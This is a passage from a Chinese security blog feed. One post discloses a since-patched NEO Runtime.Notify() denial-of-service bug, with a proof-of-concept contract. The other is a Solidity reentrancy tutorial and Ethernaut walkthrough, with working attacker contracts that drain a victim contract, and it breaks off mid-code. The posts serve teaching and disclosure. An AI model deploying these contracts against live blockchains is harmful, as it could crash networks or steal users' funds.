    <link href="http://lalajun.com/2018/09/15/0day-NEO%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%B9%B3%E5%8F%B0Runtime.Notify()%E8%B0%83%E7%94%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"/>
    <id>http://lalajun.com/2018/09/15/0day-NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞/</id>
    <published>2018-09-15T09:05:28.000Z</published>
    <updated>2019-11-06T02:41:43.313Z</updated>
    
    <content type="html"><![CDATA[<p>— 发现的第一个0day —</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><p>在实验室改以太坊的智能合约到neo。<br>改着改着发现一个拒绝服务攻击漏洞，利用攻击的话整个链会全部崩掉，没法出块，危害还挺大的，emmm，在此记录第一个0day。</p><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><hr><p><strong>漏洞名称</strong>：NEO智能合约平台Runtime.Notify()调用拒绝服务漏洞<br><strong>漏洞影响</strong>：导致Neo链上所有开启<code>log模式</code>的全节点崩溃（包括共识节点）。<br><strong>漏洞细节</strong>：出现在neo全节点虚拟机中执行智能合约语句Runtime.Notify()时发生崩溃</p><p>Neo智能合约平台为合约提供了记录数据信息输出到文件的系统调用<code>System.Runtime.Notify</code>。该调用在处理合约请求时未考虑到全部可能的数据结构，将导致智能合约系统平台crash。</p><p>其产生的影响会根据节点的部署情况而有所不同，但是都较为严重。</p><p>由于Neo目前是有7个主节点负责验证并打包全网交易。恶意用户将利用该漏洞的恶意合约发布到neo网络中，假如超过4个主节点开启了LOG功能，这些节点在解析运行该恶意合约时将引发崩溃，无法继续达成共识，进而导致整个neo网络拒绝服务。</p><p>即使主节点不使用LOG可以完成共识正常出块，但是NEO链中所有NEP5代币智能合约都会使用LOG功能，几乎所有DAPP也会使用LOG功能。所有LOG节点崩溃，会使基于NEO链的大部分智能合约瘫痪。</p><p>崩溃截图：<br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv94rl0idqj30gq0an0td.jpg" alt="崩溃截图"></p><h2 id="漏洞产生原因"><a href="#漏洞产生原因" class="headerlink" title="漏洞产生原因"></a>漏洞产生原因</h2><p>在执行Runtime.Notify没有考虑所有可能被 Runtime.Notify 写入日志文件的数据类型，在数据转化时解析出错。</p><p>Runtime.Notify 是记录智能合约日志的功能，可以输出想要知道的数据的值。类似于<code>console.log()</code>，输出的数据会写入LevevlDB数据库，最后变为一个文件。</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fv95qd5r2vj30op088t9n.jpg" alt></p><p>判断是否是log模式</p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fv95n8ki1dj30p40ag75w.jpg" alt></p><p>构建文件，写入文件</p><p>其中<code>ToParameter函数</code>在转化Map格式时崩溃。</p><blockquote><p>官方回复：因为ToParameter函数在实现的时候还没有Map，后来做了Map功能后忘记更新ToParameter了。</p></blockquote><p>ToParameter函数，在官方github中的NEO项目中<code>ContractParameter.cs</code>、<code>ContractParameterType.cs</code>、<code>Helper.cs</code>实现</p><h2 id="漏洞攻击过程"><a href="#漏洞攻击过程" class="headerlink" title="漏洞攻击过程"></a>漏洞攻击过程</h2><p><code>攻击过程</code>：</p><ul><li>构建恶意智能合约代码</li><li>部署智能合约</li><li>调用恶意智能合约</li><li>所有开启log功能的节点同步区块,执行智能合约代码，崩溃。（如果共识节点开启log功能，会直接崩溃，不会产生区块）</li></ul><p>当时提交的智能合约POC分析：<br>（复杂版，当时没有去看源码觉得有两种漏洞原因，以为可能是跟360找到的漏洞一样，因为map与struct嵌套导致漏洞，也有可能是因为其中一种结构，没有排除到根本）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework;</span><br><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.Neo;</span><br><span class="line"><span class="keyword">using</span> Neo.SmartContract.Framework.Services.System;</span><br><span class="line"><span class="keyword">using</span> Helper = Neo.SmartContract.Framework.Helper;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Numerics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">NeoContract1</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">test</span> : <span class="title">SmartContract</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//结构体</span></span><br><span class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Upload 为键值对 的 Map结构 （map_Up开头）</span></span><br><span class="line">        <span class="comment">//以 (byte[]) fileid - (结构体) Purchase 为键值对 的 Map结构 </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Upload结构体</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Upload</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID; <span class="comment">// fileID</span></span><br><span class="line">            <span class="keyword">public</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu;   <span class="comment">//Map结构</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//Purchase结构体</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Purchase</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] fileID;</span><br><span class="line">        &#125;</span><br><span class="line">.....省略合约入口.........</span><br><span class="line">        <span class="comment">//攻击调用</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">Attack</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu = <span class="keyword">new</span> Map&lt;<span class="keyword">byte</span>[], Purchase&gt;();</span><br><span class="line">            <span class="comment">//新建Purchase结构体</span></span><br><span class="line">            Purchase pu = <span class="keyword">new</span> Purchase</span><br><span class="line">            &#123;</span><br><span class="line">                fileID = fileID,</span><br><span class="line">            &#125;;</span><br><span class="line">            map_Pu[fileID] = pu;</span><br><span class="line">            <span class="comment">//新建外部upload结构体</span></span><br><span class="line">            Upload up = <span class="keyword">new</span> Upload</span><br><span class="line">            &#123;</span><br><span class="line">                fileID = fileID,</span><br><span class="line">                map_Pu = map_Pu,</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">//存储upload结构体</span></span><br><span class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</span><br><span class="line">            map_Up.Put(fileID, up.Serialize());</span><br><span class="line"></span><br><span class="line">            Runtime.Notify(<span class="string">"OK"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到fileID对应的Upload</span></span><br><span class="line">            Upload map_fileID = GetUpload(fileID);</span><br><span class="line">            <span class="comment">//问题出在这里！！！！！！！！！！！！！！！！此处崩溃</span></span><br><span class="line">            Runtime.Notify(map_fileID);</span><br><span class="line">            Runtime.Notify(map_fileID.fileID);</span><br><span class="line">            <span class="comment">//估计就是两句中上面的第一句</span></span><br><span class="line">            <span class="comment">//可能1. 一个结构体 因为结构中的非法字符 在解析写入文件的时候 导致崩溃 （可能因为结构体 其中包含着不在预期估计范围的作为结构体分割 的字符）</span></span><br><span class="line">            <span class="comment">//可能2. 一个多层嵌套 map struct 的结构体 因为多层嵌套的原因 在解析没有预计 导致崩溃</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">//得到upload的map_Pu 中对应</span></span><br><span class="line">            Map&lt;<span class="keyword">byte</span>[], Purchase&gt; map_Pu_2 = map_fileID.map_Pu;</span><br><span class="line">            Runtime.Notify(map_Pu_2[fileID]);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Upload <span class="title">GetUpload</span>(<span class="params"><span class="keyword">byte</span>[] fileID</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            StorageMap map_Up = Storage.CurrentContext.CreateMap(<span class="string">"map_Up"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> bytes = map_Up.Get(fileID);</span><br><span class="line">            <span class="keyword">if</span> (bytes.Length &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="keyword">return</span> Helper.Deserialize(bytes) <span class="keyword">as</span> Upload;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> Upload();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>按照官方的原因的话，应该直接建立一个MAP结构，Runtime.Notify(MAP)格式，就可以，不用向上面那么复杂</p><p>贴上攻击结果的一些截图：</p><p>共识节点开启log：<br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv96cituh5j311x0k57ts.jpg" alt></p><p>共识节点不开启log：<br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv96cv6vy6j311y0k81kb.jpg" alt></p><h1 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h1><p>官方于09.10修补了漏洞,添加了map对应处理情况。<a href="https://github.com/neo-project/neo/commit/e5e64ad5d413ad53effb6f815eac579df2c3aaf9#diff-724a2c89065b167abd6abdd780331db8" target="_blank" rel="noopener">修复情况链接</a></p><p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fv98b8qv3ij30ef09vt9c.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fv97ec5hi5j30o80g6t9q.jpg" alt></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>很感谢学长和老师（就不贴出名字了）引入门的指导，一直以来的支持和照顾。这也是能发现0day不可或缺的先前条件。</p><p>信息安全就是如此，潜心学习，沉淀，耐心研究，挖掘，总有收获。<br>共勉。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;— 发现的第一个0day —&lt;/p&gt;
    
    </summary>
    
    
      <category term="0day漏洞" scheme="http://lalajun.com/tags/0day%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="NEO" scheme="http://lalajun.com/tags/NEO/"/>
    
      <category term="区块链" scheme="http://lalajun.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>智能合约安全-重入攻击</title>
    <link href="http://lalajun.com/2018/08/29/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8-%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB/"/>
    <id>http://lalajun.com/2018/08/29/智能合约安全-重入攻击/</id>
    <published>2018-08-29T09:05:28.000Z</published>
    <updated>2019-08-20T08:24:32.995Z</updated>
    
    <content type="html"><![CDATA[<p>— 有意思，填一小块坑 —</p><a id="more"></a><hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直挖着关于智能合约安全问题的坑放在自己的博客列表里，包括什么RPC20代币啦，智能合约函数使用啦，巴拉巴拉。但是一直整块时间去整理。</p><p>今天知道了个有意思的跟CTF题目一样的<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">智能合约漏洞合集网站</a>。做了其中重入攻击的部分。很有意思，还尝试用了下Remix。之后考虑把它刷完。</p><p>那么回归重点。</p><hr><h1 id="重入攻击"><a href="#重入攻击" class="headerlink" title="重入攻击"></a>重入攻击</h1><p><strong>重入攻击</strong>是一种由于solidity智能合约的特性，再加上智能合约编写不当导致的漏洞。</p><p>用一句话来概括就是，攻击者会编写攻击智能合约，调用受害合约，利用自己的Fallback函数，循环调用一段受害者合约的代码。由于是因为重复进入受害者合约执行一段代码导致的漏洞，就叫做<strong>重入攻击</strong>。</p><p>在继续之前，我们列出需要解决的问题：</p><ul><li>attack(攻击者合约)如何重入victim(受害者合约)</li><li>为什么attack重入了victim，就会导致漏洞。</li></ul><p>先解决第一个问题，为什么会重入？</p><h2 id="因-Fallback、足够Gas-重入"><a href="#因-Fallback、足够Gas-重入" class="headerlink" title="因 Fallback、足够Gas 重入"></a>因 Fallback、足够Gas 重入</h2><p>受害者合约<code>Victim.sol</code>：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"></span><br><span class="line">contract Victim &#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    uint transferAmt = <span class="number">1</span> ether; </span><br><span class="line">    <span class="keyword">if</span> (!msg.sender.call.value(transferAmt)()) <span class="keyword">throw</span>; </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deposit</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以上是一个典型的会导致重入的智能合约。</p><p><code>withdraw</code>函数完成了存储在Victim合约中的代币的撤回功能。调用一次，就会转账<code>1 ether</code>到调用者用户。此处的重入攻击会导致调用一次<code>withdraw()</code>转出不只<code>1 ether</code>的钱。<br>（虽然来说这个合约，攻击者完全可以多次调用withdraw来慢慢转钱，但是只是为了演示的智能合约，不用太计较）</p><p>关键原因就是使用<code>call.value()</code>转账，但在此之前需要了解一下<strong>Fallback函数</strong></p><p>首先我们要知道，转账是可以转钱到一个智能合约地址或者一个账户地址。这两个是有所区别的————Fallback函数</p><blockquote><p>合约可以有一个未命名的函数————<a href="https://solidity-cn.readthedocs.io/zh/develop/contracts.html#fallback" target="_blank" rel="noopener">Fallback函数</a>。这个函数不能有参数也不能有返回值。 如果在一个到合约的调用中，没有其他函数与给定的函数标识符匹配（或没有提供调用数据），那么这个函数（fallback 函数）会被执行。</p><p>除此之外，每当合约收到以太币（没有任何数据），这个函数就会执行。此外，为了接收以太币，fallback 函数必须标记为 payable。 如果不存在这样的函数，则合约不能通过常规交易接收以太币。</p><p>在这样的上下文中，通常只有很少的 gas 可以用来完成这个函数调用（准确地说，是 2300 gas），所以使 fallback 函数的调用尽量廉价很重要。 请注意，调用 fallback 函数的交易（而不是内部调用）所需的 gas 要高得多，因为每次交易都会额外收取 21000 gas 或更多的费用，用于签名检查等操作。</p></blockquote><p>利用Fallback函数，我们就可以使victim调用攻击合约Fallback函数中的任意代码，但是这是智能合约合理的一些特性。因为如果没有足够的Gas，是不足以支持不断重入的。<code>call.value()</code>转账给了我们足够的Gas。</p><blockquote><p><code>&lt;address&gt;.transfer(uint256 amount)</code>:<br>向 地址类型 发送数量为 amount 的 Wei，失败时抛出 <strong>异常</strong>，发送 2300 gas 的矿工费，不可调节。</p><p><code>&lt;address&gt;.send(uint256 amount)</code>(bool):<br>向 地址类型 发送数量为 amount 的 Wei，失败时返回 <strong>false</strong>，发送 2300 gas 的矿工费用，不可调节。</p><p><code>&lt;address&gt;.call(...)</code> (bool):<br>发出低级函数 CALL，失败时返回 false，发送所有可用 gas，可调节。<br><code>.call</code>函数添加<code>.value</code>会附加上代币，形成转账</p></blockquote><p>可以看出<code>call.value</code>与<code>transfer</code>和<code>send</code>不同，会发送目前拥有的全部的gas，从而使智能合约有足够的gas不断重入。</p><h2 id="编写攻击合约"><a href="#编写攻击合约" class="headerlink" title="编写攻击合约"></a>编写攻击合约</h2><p>那么在攻击合约中使用<strong>payable fallback函数</strong>配合受害合约的转账函数发送全部的Gas。我们就可以有足够的Gas去执行自己的代码————重入。</p><p>在payable fallback函数中，我们选择继续调用受害者合约的<code>withdraw()</code>,再配合一些控制就可以任意通过一次调用，转账出任意多的代币。</p><p><code>attack.sol</code>:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.8</span>;</span><br><span class="line"><span class="comment">//引入受害合约</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">'./Victim.sol'</span>;</span><br><span class="line"><span class="comment">//攻击</span></span><br><span class="line">contract Attacker &#123;</span><br><span class="line">  <span class="comment">//受害合约实例</span></span><br><span class="line">  Victim v;</span><br><span class="line">  <span class="comment">//重入次数</span></span><br><span class="line">  uint public count;</span><br><span class="line">  <span class="comment">//日志</span></span><br><span class="line">  event LogFallback(uint c, uint balance);</span><br><span class="line">  <span class="comment">//初始化函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params">address victim</span>) </span>&#123;</span><br><span class="line">    v = Victim(victim);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//攻击函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    v.withdraw();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//payable fallback函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="title">payable</span> </span>&#123;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="comment">//记录日志</span></span><br><span class="line">    LogFallback(count, <span class="keyword">this</span>.balance);</span><br><span class="line">    <span class="comment">//限制转出10个代币</span></span><br><span class="line">    <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</span><br><span class="line">      v.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样子，只需要攻击函数的attack()，我们就可以得到10个ether</p><p>当然，我们目前做的看起来没有意义。我们只是解决了第一个问题：attack(攻击者合约)如何重入victim(受害者合约)？</p><p>那么为什么attack重入了victim，就会导致漏洞转钱很多次？真实情况可不会向之前的合约一样，调用一次就返回给你钱。你调用很多次，就给你很多钱。肯定会有所限制。</p><h2 id="资产记录的修改在转币之后"><a href="#资产记录的修改在转币之后" class="headerlink" title="资产记录的修改在转币之后"></a>资产记录的修改在转币之后</h2><p>取<a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a>部分，这更符合真实的场景，也引入重入攻击另一个重要的形成条件。</p><p><code>victim智能合约</code>关键部分如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//账户存储的代币数量（用户账单）</span></span><br><span class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"><span class="comment">//撤回钱，从账上化除</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">        <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">            _amount;</span><br><span class="line">        &#125;</span><br><span class="line">        balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//收取钱，记账</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">  balances[_to] += msg.value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这是一个可以接受撤回代币的智能合约。其中有重入漏洞，可以导致一次调用withdraw，多于记录的钱。</p><p>分析其流程：</p><ul><li>判断账目中钱是否够 Y</li><li>转钱</li><li>扣除账目中的钱</li></ul><p>咋一看没什么问题。其中的关键部分就在于 <code>balances[msg.sender] -= _amount;</code>————<strong>资产记录的修改在转币之后</strong> 。</p><p>通常来说，其他语言中这么写问题也不大，因为是同一个函数中，逐步执行的。但是在智能合约中，转账到别人的智能合约中，会调用别的智能合约的fallback函数，就会形成风险。</p><p>在结合之前的重入：<code>.call.value</code>转账导致重入 + <code>资产记录的修改在转币之后</code> 导致重入绕过验证，就可以形成恶意转账，掏空智能合约的所有代币。</p><p>分析其攻击流程（以两层来举例）：</p><ul><li>F1)判断账目中钱是否够 Y</li><li>F1)转钱</li><li>进入攻击函数的fallback函数，重新调用</li><li>F2)判断账目中钱是否够 Y</li><li>F2)转钱</li><li>F2)扣除账目中的钱</li><li>返回攻击函数的fallback函数</li><li>返回原函数</li><li>F1)扣除账目中的钱</li><li>形成溢出</li></ul><hr><h1 id="ethernaut重入题"><a href="#ethernaut重入题" class="headerlink" title="ethernaut重入题"></a>ethernaut重入题</h1><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">重入题目</a></p><h2 id="基于Remix"><a href="#基于Remix" class="headerlink" title="基于Remix"></a>基于Remix</h2><p><a href="http://remix.ethereum.org/#optimize=true&amp;version=soljson-v0.4.18+commit.9cf6e910.js" target="_blank" rel="noopener">Remix在线环境</a></p><p>目标就是从智能合约中偷走全部的钱。<br>以下是目标智能合约代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"><span class="comment">//合约</span></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  <span class="comment">//账本</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line">  <span class="comment">//收钱记账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//查看账本</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//取钱销账</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//fallback收钱函数</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路比较明显：</p><ul><li>先构造一个攻击合约</li><li>攻击合约触发donate，存入一小部分钱，使之可以满足withdaw的if判断</li><li>攻击合约触发withdraw退钱<ul><li>通过if判断</li><li><code>address.call.value()()</code>转钱进入攻击合约</li><li>执行攻击合约的payable fallback函数的内容</li><li>递归 进入合约的withdraw函数，触发退钱</li></ul></li><li>由于call方法是发送全部的gas。会一直执行到合约被榨干，没有足够的钱，转钱失败。或者gas不够，攻击失败，回滚。</li><li>当转钱失败，执行递归的最里面一层的<code>balances[msg.sender] -= _amount;</code></li><li>一层层回退，不断执行减操作，导致balances[]溢出，变为巨大整数。</li></ul><p>攻击合约构造要点：</p><ul><li>需要引用目标合约</li><li>需要一个函数触发donate</li><li>需要一个函数触发withdraw表示攻击开始</li><li>需要一个函数提取出攻击得到的钱</li></ul><p><strong>坑点</strong>：自己写攻击合约，发现无论怎么样都是失败，也不知道为啥。之后不断翻别人writeup。发现攻击函数中需要调用withdraw两次才能进入payable fallback函数。自己试验了一下，还真是这样，试验截图如下。</p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1opdicj309w065q2v.jpg" alt="cr1.png"></p><p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fuud1w4vonj30e304k743.jpg" alt="cr2.png"></p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fuud21cja7j30a0060743.jpg" alt="cr3.png"></p><p><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fuud24vl1oj30g8046wea.jpg" alt="cr4.png"></p><p>number为重入次数，instance为受害者合约地址，另一个是攻击合约地址</p><p>完全不知道原因，感觉原理也很底层，也就不深究了。<br>贴上攻击代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 